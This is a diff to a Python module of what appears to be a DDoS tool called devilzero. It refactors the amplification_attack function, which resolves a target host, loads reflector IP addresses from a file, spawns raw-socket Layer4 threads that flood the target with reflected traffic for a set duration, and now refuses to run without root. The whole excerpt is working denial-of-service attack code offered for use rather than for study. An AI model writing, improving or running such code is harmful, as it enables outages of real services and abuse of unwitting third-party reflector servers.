@@ -7,46 +7,50 @@ from itertools import cycle
 
 from .core import Tools, REQUESTS_SENT, BYTES_SEND, LOCAL_IP
 from .layer4 import Layer4
-from .utils import Colors
-from .config import config
+from .utils import Colors, is_root, print_error, print_warning, print_success
 
 def amplification_attack(host: str, port: int, method: str, threads: int, duration: int, reflector_file: str):
     """
     Run an amplification attack using reflectors.
     """
+    if not is_root():
+        print_error("Amplification attacks require root privileges (raw sockets).")
+        print_warning("Please run with sudo: sudo devilzero")
+        return
+
     # Resolve host
     try:
         host_ip = socket.gethostbyname(host)
     except Exception as e:
-        print(f"{Colors.FAIL}Cannot resolve host: {e}{Colors.RESET}")
+        print_error(f"Cannot resolve host: {e}")
         return
 
     # Check raw socket capability
     if not _check_raw_socket():
-        print(f"{Colors.WARNING}Raw socket creation failed. This attack may require root privileges.{Colors.RESET}")
+        print_error("Raw socket creation failed. This attack requires root privileges.")
         return
 
     # Load reflectors
     ref_path = Path(reflector_file)
     if not ref_path.exists():
-        print(f"{Colors.FAIL}Reflector file not found: {reflector_file}{Colors.RESET}")
+        print_error(f"Reflector file not found: {reflector_file}")
         return
 
     with open(ref_path, 'r') as f:
         content = f.read()
         ref = set(Tools.IP.findall(content))
     if not ref:
-        print(f"{Colors.FAIL}No valid IP addresses found in reflector file.{Colors.RESET}")
+        print_error("No valid IP addresses found in reflector file.")
         return
 
-    print(f"{Colors.OKGREEN}Loaded {len(ref)} reflectors.{Colors.RESET}")
+    print_success(f"Loaded {len(ref)} reflectors.")
 
     event = Event()
     event.clear()
     for _ in range(threads):
         Layer4((host_ip, port), list(ref), method, event, None).start()
 
-    print(f"{Colors.OKGREEN}[!] Amplification attack started on {host}:{port} with method {method} for {duration} seconds.{Colors.RESET}")
+    print_success(f"Amplification attack started on {host}:{port} with method {method} for {duration} seconds.")
     event.set()
     start_time = time.time()
     while time.time() < start_time + duration:
@@ -55,7 +59,7 @@ def amplification_attack(host: str, port: int, method: str, threads: int, durati
         BYTES_SEND.set(0)
         time.sleep(1)
     event.clear()
-    print(f"\n{Colors.OKGREEN}[!] Attack stopped.{Colors.RESET}")
+    print_success("Attack stopped.")
 
 def _check_raw_socket() -> bool:
     try:
